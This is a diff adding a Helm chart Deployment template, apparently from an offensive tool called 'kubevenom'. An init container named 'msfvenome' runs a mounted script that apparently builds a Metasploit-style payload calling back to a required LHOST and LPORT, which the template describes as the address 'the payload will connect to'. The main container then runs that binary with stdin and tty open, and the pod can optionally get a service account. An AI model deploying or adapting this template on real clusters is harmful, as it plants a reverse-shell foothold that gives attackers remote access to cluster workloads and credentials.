@@ -1,0 +1,85 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: {{ include "kubevenom.fullname" . }}
+  labels:
+    {{- include "kubevenom.labels" . | nindent 4 }}
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      {{- include "kubevenom.selectorLabels" . | nindent 6 }}
+  template:
+    metadata:
+      labels:
+        {{- include "kubevenom.selectorLabels" . | nindent 8 }}
+    spec:
+    {{- with .Values.imagePullSecrets }}
+      imagePullSecrets:
+        {{- toYaml . | nindent 8 }}
+    {{- end }}
+      {{- if .Values.priviliges.useServiceAccount }}
+      serviceAccountName: {{ include "kubevenom.fullname" . }}
+      {{ else }}
+      automountServiceAccountToken: false
+      {{ end }}
+      securityContext:
+        {{- toYaml .Values.priviliges.podSecurityContext | nindent 8 }}
+      initContainers:
+        - name: msfvenome
+          image: "{{ .Values.image.repository}}:{{ .Values.image.tag }}"
+          imagePullPolicy: {{ .Values.image.pullPolicy }}        
+          command: ["/bin/bash", "-c", "/tmp/kubevenom.sh"]
+          env:
+            - name: LHOST
+              value: "{{ required "Please provide value to 'lhost' - The IP Address the payload will connect to" .Values.lhost }}"
+            - name: LPORT
+              value: "{{ required "Please provide value to 'lport' - The Port the payload will connect to" .Values.lport }}"
+          volumeMounts:
+            - name: kubevenom
+              mountPath: /kubevenom
+            - name: msfvenome
+              mountPath: /tmp/kubevenom.sh
+              subPath: kubevenom.sh
+              
+      containers:
+        - name: {{ .Chart.Name }}
+          image: gcr.io/google_containers/pause-amd64:3.0
+          imagePullPolicy: {{ .Values.image.pullPolicy }}        
+          command: ["/kubevenom/kubevenom"]
+          tty: true
+          stdin: true
+          securityContext:
+            {{- toYaml .Values.priviliges.securityContext | nindent 12 }}
+
+          resources:
+            {{- toYaml .Values.resources | nindent 12 }}
+          volumeMounts:
+            - name: kubevenom
+              mountPath: /kubevenom
+ 
+      restartPolicy: Always
+      volumes:
+        - name: kubevenom
+          emptyDir: {}
+        - name: msfvenome
+          configMap:
+            name: {{ include "kubevenom.fullname" . }}
+            items:
+            - key: kubevenom.sh
+              path: kubevenom.sh
+            defaultMode: 0777
+
+
+      {{- with .Values.nodeSelector }}
+      nodeSelector:
+        {{- toYaml . | nindent 8 }}
+      {{- end }}
+    {{- with .Values.affinity }}
+      affinity:
+        {{- toYaml . | nindent 8 }}
+    {{- end }}
+    {{- with .Values.tolerations }}
+      tolerations:
+        {{- toYaml . | nindent 8 }}
+    {{- end }}
